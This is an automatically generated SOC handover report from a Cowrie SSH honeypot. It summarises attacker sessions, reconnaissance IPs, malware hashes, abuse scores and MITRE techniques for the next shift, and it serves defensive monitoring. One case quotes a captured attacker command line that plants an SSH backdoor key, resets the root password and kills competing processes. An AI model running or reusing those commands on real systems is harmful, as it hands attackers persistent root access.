| `2026-03-31 12:32:25` | `cowrie.login.success` |
| `2026-03-31 12:32:25` | `cowrie.session.params` |
| `2026-03-31 12:32:25` | `cowrie.command.input` |
| `2026-03-31 12:32:25` | `cowrie.command.failed` |
| `2026-03-31 12:32:25` | `cowrie.log.closed` |
| `2026-03-31 12:32:25` | `cowrie.session.params` |
| `2026-03-31 12:32:25` | `cowrie.command.input` |
| `2026-03-31 12:32:26` | `cowrie.session.file_download` |
| `2026-03-31 12:32:26` | `cowrie.log.closed` |
| `2026-03-31 12:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.81.72[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.81.72[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ea638b992b1

| Field | Detail |
|---|---|
| **Source IP** | `34.81.72[.]185` |
| **First Seen** | 2026-03-31 12:32 |
| **Last Seen** | 2026-03-31 12:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 12:32:28` | `cowrie.session.connect` |
| `2026-03-31 12:32:28` | `cowrie.client.version` |
| `2026-03-31 12:32:28` | `cowrie.client.kex` |
| `2026-03-31 12:32:28` | `cowrie.login.success` |
| `2026-03-31 12:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.81.72[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.81.72[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f85632993b

| Field | Detail |
|---|---|
| **Source IP** | `183.56.241[.]96` |
| **First Seen** | 2026-03-31 12:53 |
| **Last Seen** | 2026-03-31 12:53 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:LmeBMRCSrrjn"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 12:53:16` | `cowrie.session.connect` |
| `2026-03-31 12:53:16` | `cowrie.client.version` |
| `2026-03-31 12:53:18` | `cowrie.client.kex` |
| `2026-03-31 12:53:19` | `cowrie.login.success` |
| `2026-03-31 12:53:20` | `cowrie.session.params` |
| `2026-03-31 12:53:20` | `cowrie.command.input` |
| `2026-03-31 12:53:20` | `cowrie.command.failed` |
| `2026-03-31 12:53:21` | `cowrie.log.closed` |
| `2026-03-31 12:53:21` | `cowrie.session.params` |
| `2026-03-31 12:53:21` | `cowrie.command.input` |
| `2026-03-31 12:53:22` | `cowrie.session.file_download` |
| `2026-03-31 12:53:22` | `cowrie.log.closed` |
| `2026-03-31 12:53:38` | `cowrie.session.params` |
| `2026-03-31 12:53:38` | `cowrie.command.input` |
| `2026-03-31 12:53:39` | `cowrie.log.closed` |
| `2026-03-31 12:53:39` | `cowrie.session.params` |
| `2026-03-31 12:53:39` | `cowrie.command.input` |
| `2026-03-31 12:53:40` | `cowrie.log.closed` |
| `2026-03-31 12:53:41` | `cowrie.session.params` |
| `2026-03-31 12:53:41` | `cowrie.command.input` |
| `2026-03-31 12:53:41` | `cowrie.session.file_download` |
| `2026-03-31 12:53:41` | `cowrie.log.closed` |
| `2026-03-31 12:53:41` | `cowrie.session.params` |
| `2026-03-31 12:53:41` | `cowrie.command.input` |
| `2026-03-31 12:53:41` | `cowrie.log.closed` |
| `2026-03-31 12:53:42` | `cowrie.session.params` |
| `2026-03-31 12:53:42` | `cowrie.command.input` |
| `2026-03-31 12:53:43` | `cowrie.log.closed` |
| `2026-03-31 12:53:43` | `cowrie.session.params` |
| `2026-03-31 12:53:43` | `cowrie.command.input` |
| `2026-03-31 12:53:43` | `cowrie.command.input` |
| `2026-03-31 12:53:44` | `cowrie.log.closed` |
| `2026-03-31 12:53:44` | `cowrie.session.params` |
| `2026-03-31 12:53:44` | `cowrie.command.input` |
| `2026-03-31 12:53:45` | `cowrie.log.closed` |
| `2026-03-31 12:53:45` | `cowrie.session.params` |
| `2026-03-31 12:53:45` | `cowrie.command.input` |
| `2026-03-31 12:53:46` | `cowrie.log.closed` |
| `2026-03-31 12:53:47` | `cowrie.session.params` |
| `2026-03-31 12:53:47` | `cowrie.command.input` |
| `2026-03-31 12:53:47` | `cowrie.log.closed` |
| `2026-03-31 12:53:48` | `cowrie.session.params` |
| `2026-03-31 12:53:48` | `cowrie.command.input` |
| `2026-03-31 12:53:49` | `cowrie.log.closed` |
| `2026-03-31 12:53:51` | `cowrie.session.params` |
| `2026-03-31 12:53:51` | `cowrie.command.input` |
| `2026-03-31 12:53:51` | `cowrie.log.closed` |
| `2026-03-31 12:53:52` | `cowrie.session.params` |
| `2026-03-31 12:53:52` | `cowrie.command.input` |
| `2026-03-31 12:53:52` | `cowrie.log.closed` |
| `2026-03-31 12:53:53` | `cowrie.session.params` |
| `2026-03-31 12:53:53` | `cowrie.command.input` |
| `2026-03-31 12:53:53` | `cowrie.log.closed` |
| `2026-03-31 12:53:54` | `cowrie.session.params` |
| `2026-03-31 12:53:54` | `cowrie.command.input` |
| `2026-03-31 12:53:54` | `cowrie.log.closed` |
| `2026-03-31 12:53:54` | `cowrie.session.params` |
| `2026-03-31 12:53:54` | `cowrie.command.input` |
| `2026-03-31 12:53:55` | `cowrie.log.closed` |
| `2026-03-31 12:53:57` | `cowrie.session.params` |
| `2026-03-31 12:53:57` | `cowrie.command.input` |
| `2026-03-31 12:53:57` | `cowrie.log.closed` |
| `2026-03-31 12:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.56.241[.]96` to AbuseIPDB if not already reported
- [ ] Block `183.56.241[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]130` | **2** | 2026-03-31 11:02 | 2026-03-31 13:01 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `183.56.241[.]96` | **2** | 2026-03-31 12:53 | 2026-03-31 12:55 | 4m | 0 | `T1592` | 🟢 LOW |
| `47.86.90[.]93` | **2** | 2026-03-31 11:28 | 2026-03-31 11:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]193` | **2** | 2026-03-31 12:55 | 2026-03-31 12:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.144.28[.]85` | 1 | 2026-03-31 11:18 | 2026-03-31 11:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.94.81[.]252` | 1 | 2026-03-31 12:11 | 2026-03-31 12:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `104.248.158[.]38` | 1 | 2026-03-31 10:57 | 2026-03-31 10:57 | 8s | 0 | `T1592` | 🟢 LOW |
| `106.245.246[.]26` | 1 | 2026-03-31 11:48 | 2026-03-31 11:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.246.89[.]72` | 1 | 2026-03-31 11:46 | 2026-03-31 11:46 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.228.28[.]53` | 1 | 2026-03-31 13:10 | 2026-03-31 13:10 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.59.150[.]123` | 1 | 2026-03-31 12:31 | 2026-03-31 12:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `116.114.94[.]242` | 1 | 2026-03-31 13:05 | 2026-03-31 13:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.80[.]70` | 1 | 2026-03-31 11:48 | 2026-03-31 11:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.202.225[.]98` | 1 | 2026-03-31 13:08 | 2026-03-31 13:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.149[.]158` | 1 | 2026-03-31 11:53 | 2026-03-31 11:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.255.14[.]82` | 1 | 2026-03-31 12:30 | 2026-03-31 12:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.6[.]104` | 1 | 2026-03-31 11:54 | 2026-03-31 11:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.190.142[.]151` | 1 | 2026-03-31 11:56 | 2026-03-31 11:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]58` | 1 | 2026-03-31 12:48 | 2026-03-31 12:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.125.104[.]245` | 1 | 2026-03-31 11:06 | 2026-03-31 11:06 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.170[.]111` | 1 | 2026-03-31 12:56 | 2026-03-31 12:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.79.218[.]101` | 1 | 2026-03-31 12:10 | 2026-03-31 12:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.59.15[.]180` | 1 | 2026-03-31 11:09 | 2026-03-31 11:09 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.90.79[.]29` | 1 | 2026-03-31 12:28 | 2026-03-31 12:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.31.8[.]12` | 1 | 2026-03-31 12:50 | 2026-03-31 12:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.70[.]26` | 1 | 2026-03-31 12:25 | 2026-03-31 12:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.46.45[.]121` | 1 | 2026-03-31 12:05 | 2026-03-31 12:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.85.222[.]190` | 1 | 2026-03-31 11:03 | 2026-03-31 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.47.103[.]61` | 1 | 2026-03-31 11:10 | 2026-03-31 11:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.219.131[.]90` | 1 | 2026-03-31 11:52 | 2026-03-31 11:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.233.80[.]81` | 1 | 2026-03-31 12:31 | 2026-03-31 12:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.146.248[.]7` | 1 | 2026-03-31 11:46 | 2026-03-31 11:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.81.72[.]185` | 1 | 2026-03-31 12:32 | 2026-03-31 12:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.130.111[.]146` | 1 | 2026-03-31 12:08 | 2026-03-31 12:10 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.155.40[.]91` | 1 | 2026-03-31 12:12 | 2026-03-31 12:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.173.38[.]229` | 1 | 2026-03-31 11:50 | 2026-03-31 11:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `67.58.117[.]95` | 1 | 2026-03-31 11:26 | 2026-03-31 11:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `98.84.153[.]117` | 1 | 2026-03-31 12:55 | 2026-03-31 12:55 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `190.90.79[.]29` | CO | IP TECHNOLOGIES S.A.S. | **100** ⚠️ | 2 |
| `188.59.15[.]180` | TR | TURKCELL INTERNET | **100** ⚠️ | 17 |
| `2.55.70[.]26` | IL | Partner Communications Ltd. | **100** ⚠️ | 28 |
| `66.132.186[.]193` | US | Censys, Inc. | **100** ⚠️ | 11 |
| `103.94.81[.]252` | IN | J.sky Media Pvt.ltd. | **100** ⚠️ | 22 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `212.47.103[.]61` | LT | Telia Lietuva, AB | **100** ⚠️ | 16 |
| `35.130.111[.]146` | US | Charter Communications LLC | **100** ⚠️ | 50 |
| `143.255.14[.]82` | BR | RBT Internet | **100** ⚠️ | 7 |
| `106.246.89[.]72` | KR | LG DACOM Corporation | **100** ⚠️ | 28 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 26 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 62 cases |
| Tool 34  | Credential Extractor        | ✅ 43 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (8.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 15 priority case(s) shown individually · 38 recon entry/entries in table (4 group(s) consolidating 8 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-31T13:14:05Z_
